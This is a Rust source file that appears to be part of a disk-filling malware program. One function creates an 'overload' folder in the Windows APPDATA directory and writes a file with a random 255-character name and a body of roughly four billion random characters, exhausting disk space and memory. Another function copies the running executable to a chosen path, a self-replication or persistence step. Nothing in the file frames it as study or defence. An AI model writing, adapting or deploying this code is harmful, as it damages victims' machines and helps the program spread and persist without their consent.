use rand::{thread_rng, Rng};
use std::{
    env,
    fs::{copy, create_dir_all, write},
    io::{self},
};

pub fn join_paths(f: String, s: String) -> String {
    format!(r#"{f}\{s}"#)
}

async fn random_string(length: usize) -> String {
    const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789~@#$%^-_(){}'`";

    println!("Creating string: {length}");

    (0..length)
        .map(|_| {
            let idx = {
                let mut rng = thread_rng();
                rng.gen_range(0..CHARSET.len())
            };
            CHARSET[idx] as char
        })
        .collect()
}

pub async fn random_file() -> io::Result<()> {
    const MAX_PATH_LENGTH: usize = 255;
    const MAX_TEXT_LENGTH: usize = 4294967295;

    let dir = join_paths(env::var("appdata").expect(""), "overload".to_string());
    create_dir_all(dir.clone())?;
    println!("Starting generating");

    let dir = join_paths(dir, random_string(MAX_PATH_LENGTH).await);
    let body: String = random_string(MAX_TEXT_LENGTH).await;
    write(dir.clone(), body.clone())?;

    println!("Created file at: {dir}");
    Ok(())
}

pub fn self_copy(file_dir: String) -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    let arg = args.first().unwrap();

    copy(arg, file_dir)?;

    Ok(())
}
